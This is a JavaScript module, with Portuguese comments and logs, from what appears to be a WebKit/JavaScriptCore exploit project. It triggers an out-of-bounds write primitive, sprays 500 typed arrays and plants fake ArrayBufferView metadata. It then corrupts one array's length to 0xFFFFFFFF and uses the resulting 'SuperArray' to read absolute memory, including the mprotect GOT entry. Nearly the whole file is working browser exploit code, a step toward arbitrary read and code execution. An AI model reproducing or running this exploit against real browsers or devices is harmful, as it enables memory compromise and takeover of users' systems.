// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO, OOB_CONFIG } from '../config.mjs';

const FNAME_REPLICATE_LOG_SUCCESS = "replicateLogSuccessAndValidateSuperArray_v26a"; // Definição correta

const CORRUPTION_OFFSET_TRIGGER = 0x70; 
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const VICTIM_VIEW_METADATA_BASE_IN_OOB = 0x58; 
const ACTUAL_M_VECTOR_OFFSET_IN_OOB = VICTIM_VIEW_METADATA_BASE_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
const ACTUAL_M_LENGTH_OFFSET_IN_OOB = VICTIM_VIEW_METADATA_BASE_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 

const INITIAL_PLANTED_M_VECTOR = new AdvancedInt64(0x11223344, 0xAABBCCDD); 
const INITIAL_PLANTED_M_LENGTH_DWORD = 0xBAD0BAD0; 

const EXPECTED_CORRUPTED_M_VECTOR_VAL = new AdvancedInt64(0xAABBCCDD, 0x11223344); 
const EXPECTED_CORRUPTED_M_LENGTH_VAL = 0xFFFFFFFF;

const NUM_SPRAY_OBJECTS = 500;
const ORIGINAL_SPRAY_LENGTH = 8;

const MARKER_FOR_OOB_BUFFER_CHECK = 0xABBAABBA;
const MARKER_OFFSET_IN_OOB_DATA = 0x40; 

let sprayedVictimObjects = [];

// Função readQwordAbsolute (como fornecida anteriormente, sem alterações)
function readQwordAbsolute(superArrayForRead, address_qword_to_read) {
    if (!superArrayForRead || superArrayForRead.length !== EXPECTED_CORRUPTED_M_LENGTH_VAL) { // Usar a constante correta aqui
        logS3(`[readQwordAbsolute] SuperArray inválido ou length não esperado. Length: ${superArrayForRead ? superArrayForRead.length : 'N/A'} vs Esperado: ${toHex(EXPECTED_CORRUPTED_M_LENGTH_VAL)}`, "error", FNAME_REPLICATE_LOG_SUCCESS);
        return null;
    }
    if (!isAdvancedInt64Object(address_qword_to_read)) {
        address_qword_to_read = new AdvancedInt64(address_qword_to_read);
    }

    if (address_qword_to_read.high() !== 0) {
        logS3(`[readQwordAbsolute] Aviso: Tentando ler de endereço 64-bit ${address_qword_to_read.toString(true)} com SuperArray (Uint32Array).`, "warn", FNAME_REPLICATE_LOG_SUCCESS);
        return null; 
    }

    const base_address_low = address_qword_to_read.low();
    const index_low = base_address_low / 4;
    const index_high = (base_address_low / 4) + 1;

    if (index_high >= superArrayForRead.length) {
        logS3(`[readQwordAbsolute] Endereço ${toHex(base_address_low)} fora dos limites do superArray (length ${toHex(superArrayForRead.length)}) para ler QWORD.`, "error", FNAME_REPLICATE_LOG_SUCCESS);
        return null;
    }
    
    try {
        const low_dword = superArrayForRead[index_low];
        const high_dword = superArrayForRead[index_high];
        return new AdvancedInt64(low_dword, high_dword);
    } catch (e) {
        logS3(`[readQwordAbsolute] Erro ao ler do SuperArray nos índices ${toHex(index_low)}/${toHex(index_high)}: ${e.message}`, "error", FNAME_REPLICATE_LOG_SUCCESS);
        return null;
    }
}


export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_REPLICATE_LOG_SUCCESS}: Replicar Corrupção de Log e Validar SuperArray ---`, "test", FNAME_REPLICATE_LOG_SUCCESS);
    sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { 
             logS3("Falha OOB Init", "critical", FNAME_REPLICATE_LOG_SUCCESS); // CORRIGIDO AQUI
             return; 
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_REPLICATE_LOG_SUCCESS);

        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            u32arr[0] = 0xC0DEC0DE ^ i;
            sprayedVictimObjects.push(u32arr);
        }
        logS3("Pulverização concluída.", "good", FNAME_REPLICATE_LOG_SUCCESS);

        logS3(`FASE 2: Plantando metadados em oob_buffer para replicação...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        logS3(`  Plantando m_vector_candidate=${INITIAL_PLANTED_M_VECTOR.toString(true)} em oob_buffer[${toHex(ACTUAL_M_VECTOR_OFFSET_IN_OOB)}] (0x68)`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        oob_write_absolute(ACTUAL_M_VECTOR_OFFSET_IN_OOB, INITIAL_PLANTED_M_VECTOR, 8);
        
        logS3(`  Plantando m_length_candidate=${toHex(INITIAL_PLANTED_M_LENGTH_DWORD)} em oob_buffer[${toHex(ACTUAL_M_LENGTH_OFFSET_IN_OOB)}] (0x70)`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        oob_write_absolute(ACTUAL_M_LENGTH_OFFSET_IN_OOB, INITIAL_PLANTED_M_LENGTH_DWORD, 4);

        const chk_vec_pre = oob_read_absolute(ACTUAL_M_VECTOR_OFFSET_IN_OOB, 8);
        const chk_len_pre = oob_read_absolute(ACTUAL_M_LENGTH_OFFSET_IN_OOB, 4);
        logS3(`  Verificação Pós-Plantio (no oob_buffer ANTES DO TRIGGER):`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        logS3(`    m_vector@${toHex(ACTUAL_M_VECTOR_OFFSET_IN_OOB)}=${chk_vec_pre.toString(true)} (Esperado: ${INITIAL_PLANTED_M_VECTOR.toString(true)})`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        logS3(`    m_length@${toHex(ACTUAL_M_LENGTH_OFFSET_IN_OOB)}=${toHex(chk_len_pre)} (Esperado: ${toHex(INITIAL_PLANTED_M_LENGTH_DWORD)})`, "info", FNAME_REPLICATE_LOG_SUCCESS);

        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] (0x70) com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_REPLICATE_LOG_SUCCESS);
        
        const vec_in_oob_after_trigger = oob_read_absolute(ACTUAL_M_VECTOR_OFFSET_IN_OOB, 8); 
        const len_in_oob_after_trigger = oob_read_absolute(ACTUAL_M_LENGTH_OFFSET_IN_OOB, 4); 
        logS3(`  Valores NO OOB_BUFFER APÓS trigger:`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        logS3(`    m_vector@${toHex(ACTUAL_M_VECTOR_OFFSET_IN_OOB)} (0x68) = ${vec_in_oob_after_trigger.toString(true)}`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        logS3(`    m_length@${toHex(ACTUAL_M_LENGTH_OFFSET_IN_OOB)} (0x70) = ${toHex(len_in_oob_after_trigger)}`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        
        await PAUSE_S3(250);

        logS3(`FASE 4: Tentando identificar SuperArray (pelo length)...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        let superArray = null;
        let superArrayIndex = -1;

        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === EXPECTED_CORRUPTED_M_LENGTH_VAL) {
                superArray = sprayedVictimObjects[i];
                superArrayIndex = i;
                logS3(`    !!!! POTENCIAL SUPERARRAY !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_REPLICATE_LOG_SUCCESS);
                document.title = `POTENCIAL SuperArray Idx ${i}!`;
                break; 
            }
        }

        if (superArray) {
            logS3("  SuperArray obtido. Testando leitura de endereço 0x0 (para validar m_vector=0).", "info", FNAME_REPLICATE_LOG_SUCCESS);
            try {
                const val_at_zero = superArray[0]; 
                logS3(`    Leitura de teste com SuperArray: superArray[0] (de endereço absoluto 0x0) = ${toHex(val_at_zero)}`, "leak", FNAME_REPLICATE_LOG_SUCCESS);
                document.title = `SuperArray LEU 0x0: ${toHex(val_at_zero)}`;
                
                let mprotect_got_addr_str = WEBKIT_LIBRARY_INFO.GOT_ENTRIES?.mprotect;
                if (mprotect_got_addr_str) {
                    const mprotect_got_addr = parseInt(mprotect_got_addr_str, 16);
                    if (!isNaN(mprotect_got_addr) && (mprotect_got_addr / 4) < superArray.length) {
                        logS3(`  Tentando ler entrada da GOT de mprotect (${toHex(mprotect_got_addr)}) usando SuperArray...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
                        const mprotect_val_qword = readQwordAbsolute(superArray, new AdvancedInt64(mprotect_got_addr, 0));
                        if (mprotect_val_qword) {
                            logS3(`    !!!! VALOR LIDO DA GOT (mprotect @ ${toHex(mprotect_got_addr)}): ${mprotect_val_qword.toString(true)} !!!!`, "vuln", FNAME_REPLICATE_LOG_SUCCESS);
                            document.title = `GOT mprotect: ${mprotect_val_qword.toString(true).slice(-10)}`;
                        } else {
                            logS3(`    Falha ao ler GOT de mprotect com SuperArray ou endereço inválido/fora dos limites.`, "warn", FNAME_REPLICATE_LOG_SUCCESS);
                        }
                    } else {
                        logS3(`    Endereço da GOT de mprotect (${toHex(mprotect_got_addr)}) fora dos limites do SuperArray ou inválido.`, "warn", FNAME_REPLICATE_LOG_SUCCESS);
                    }
                } else {
                    logS3("    Offset da GOT de mprotect não definido em config.mjs.", "info", FNAME_REPLICATE_LOG_SUCCESS);
                }

            } catch (e) {
                logS3(`    Erro ao usar SuperArray para ler de 0x0 (ou GOT): ${e.message}`, "error", FNAME_REPLICATE_LOG_SUCCESS);
                document.title = "SuperArray ERRO LEITURA";
            }
        } else {
            logS3("  Nenhum SuperArray (Uint32Array com length corrompido para 0xFFFFFFFF) identificado.", "error", FNAME_REPLICATE_LOG_SUCCESS); // CORRIGIDO AQUI
            document.title = "SuperArray NÃO Encontrado (v26a)";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_REPLICATE_LOG_SUCCESS}: ${e.message}`, "critical", FNAME_REPLICATE_LOG_SUCCESS); // CORRIGIDO AQUI
        document.title = `${FNAME_REPLICATE_LOG_SUCCESS} FALHOU!`; // CORRIGIDO AQUI
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_REPLICATE_LOG_SUCCESS} Concluído ---`, "test", FNAME_REPLICATE_LOG_SUCCESS); // CORRIGIDO AQUI
    }
}
